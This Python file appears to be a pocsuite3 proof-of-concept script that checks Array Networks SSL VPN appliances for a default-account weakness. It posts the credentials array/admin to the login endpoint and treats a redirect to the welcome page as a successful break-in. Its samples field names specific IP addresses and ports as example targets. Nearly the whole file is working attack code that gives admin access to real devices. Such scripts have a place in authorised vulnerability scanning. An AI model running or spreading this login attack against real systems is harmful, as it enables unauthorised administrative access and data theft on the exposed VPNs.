#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re
import json

class TestPOC(POCBase):
	vulID = 'DSO-07122'
	cveID = ''
	cnvdID = ''
	cnnvdID = ''
	version = '1.0'
	author = '木星'
	vulDate = '2022-07-27'
	createDate = '2022-07-27'
	updateDate = '2022-07-27'
	name = 'Array Networks SSL VPN 存在默认账号密码漏洞'
	desc = 'ARRAY NETWORKS, INC. Array Networks SSL VPN存在默认账号密码漏洞，攻击者利用该漏洞可以直接进入后台，执行其他敏感操作，获取更多敏感数据。'
	solution = '<p>禁止使用默认口令，口令应满足一定复杂度。</p>'
	severity = 'medium'
	vulType = 'default-pass'
	taskType = 'app-vul'
	proto = ['http']
	scanFlag = 1
	tag = ['important']
	references = ['']
	appName = 'Array Networks SSL VPN'
	appVersion = 'all'
	cweID = 'CWE-521'
	appPowerLink =''
	samples = ['https://58.34.192.10:10333/','https://58.34.192.10:10162','https://58.34.192.10:10035/']
	appDevLanguage = ''
	appCategory = '网络设备'
	
	def _attack(self):
		return self._verify()

	def _verify(self):
		result = {}
		headers = {
			'Content-Type':'application/x-www-form-urlencoded',
		   	'Referer':self.url
		}
		path = '/prx/000/http/localhost/login'
		data = 'method=LocalDB&uname=array&pwd=admin&pwd1=&pwd2=&hardwareid='
		vulur = self.url + path
		base_resp = requests.post(vulur, headers = headers, verify = False, allow_redirects = False, data = data, timeout = 10)
		check = self.url + 'prx/000/http/localhost/welcome'
		if  base_resp.status_code == 302 and check in base_resp.headers["Location"]:
			result['VerifyInfo'] = {}
			result['VerifyInfo']['URL'] = vulur
			result['VerifyInfo']['Content'] = "array/admin"
		return self.parse_verify(result)

	def parse_verify(self, result):
		output = Output(self)
		if result:
			output.success(result)
		else:
			output.fail('target is not vulnerable')
		return output


register_poc(TestPOC)
